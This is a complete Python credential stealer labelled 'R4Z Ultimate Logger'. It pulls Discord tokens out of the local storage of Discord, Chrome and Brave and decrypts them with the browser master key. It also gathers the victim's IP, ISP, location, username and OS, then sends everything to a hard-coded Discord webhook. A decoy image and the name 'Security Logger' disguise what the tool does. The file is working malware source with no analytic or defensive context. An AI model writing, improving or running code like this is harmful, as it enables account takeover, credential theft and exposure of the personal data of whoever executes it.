import os, re, json, base64, sqlite3, requests, subprocess, shutil
from PIL import ImageGrab
import win32crypt
try: from Cryptodomex.Cipher import AES
except: from Cryptodome.Cipher import AES

# --- CONFIGURATION (DeKrypt Style) ---
config = {
    "webhook": "https://discord.com/api/webhooks/1418902069984759868/QeEnBq9MY1Krb1eWER3P7NPDwhJK8QoqZVjHJVkWWxiJhsgNkO-Hv3FbOQ9JlCrKU8nH",
    "color": 0x00FFFF,
    "username": "R4Z Security Logger",
    "decoy_img": "https://files.catbox.moe/yp5a33.jpg"
}

class R4Z_Ultimate_Logger:
    def __init__(self):
        self.tokens = []
        self.appdata = os.getenv('APPDATA')
        self.local = os.getenv('LOCALAPPDATA')

    def get_master_key(self, path):
        if not os.path.exists(path): return None
        with open(path, "r", encoding='utf-8') as f:
            local_state = json.loads(f.read())
        m_key = win32crypt.CryptUnprotectData(base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
        return m_key

    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)[:-16].decode()

    def grab_tokens(self):
        paths = {
            'Discord': os.path.join(self.appdata, 'discord'),
            'Discord Canary': os.path.join(self.appdata, 'discordcanary'),
            'Google Chrome': os.path.join(self.local, r'Google\Chrome\User Data\Default'),
            'Brave': os.path.join(self.local, r'BraveSoftware\Brave-Browser\User Data\Default')
        }
        for name, path in paths.items():
            leveldb = os.path.join(path, 'Local Storage', 'leveldb')
            if not os.path.exists(leveldb): continue
            m_key = self.get_master_key(os.path.join(path, "Local State"))
            for file_name in os.listdir(leveldb):
                if file_name.endswith(('.log', '.ldb')):
                    with open(os.path.join(leveldb, file_name), 'r', errors='ignore') as f:
                        for line in f.readlines():
                            for token in re.findall(r"dQw4w9WgXcQ:([^ ]*)", line.strip()):
                                if m_key:
                                    dec_token = self.decrypt_val(base64.b64decode(token.split('"')[0]), m_key)
                                    if dec_token not in self.tokens: self.tokens.append(dec_token)
                            for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", line.strip()):
                                if token not in self.tokens: self.tokens.append(token)

    def decrypt_val(self, buff, master_key):
        try:
            iv, payload = buff[3:15], buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except: return None

    def get_ip_info(self):
        try:
            r = requests.get("http://ip-api.com/json/?fields=225545").json()
            return r
        except: return None

    def make_report(self):
        ip_info = self.get_ip_info()
        self.grab_tokens()
        
        # إنشاء الـ Embed بحال اللجيك ديال DeKrypt
        embed = {
            "title": "🔴 New Session Captured",
            "color": config["color"],
            "fields": [
                {
                    "name": "🌐 Network Info",
                    "value": f"**IP:** `{ip_info['query']}`\n**Country:** `{ip_info['country']}`\n**ISP:** `{ip_info['isp']}`\n**VPN/Proxy:** `{ip_info['proxy']}`",
                    "inline": False
                },
                {
                    "name": "🔑 Discord Tokens",
                    "value": "\n".join([f"`{t}`" for t in self.tokens]) if self.tokens else "No tokens found",
                    "inline": False
                },
                {
                    "name": "💻 PC Info",
                    "value": f"**User:** `{os.getlogin()}`\n**OS:** `{os.getenv('OS')}`",
                    "inline": True
                }
            ],
            "footer": {"text": "R4Z Security Analysis - DeKrypt Logic"},
            "thumbnail": {"url": config["decoy_img"]}
        }
        
        requests.post(config["webhook"], json={"username": config["username"], "embeds": [embed]})

    def run(self):
        self.make_report()

if __name__ == "__main__":
    R4Z_Ultimate_Logger().run()
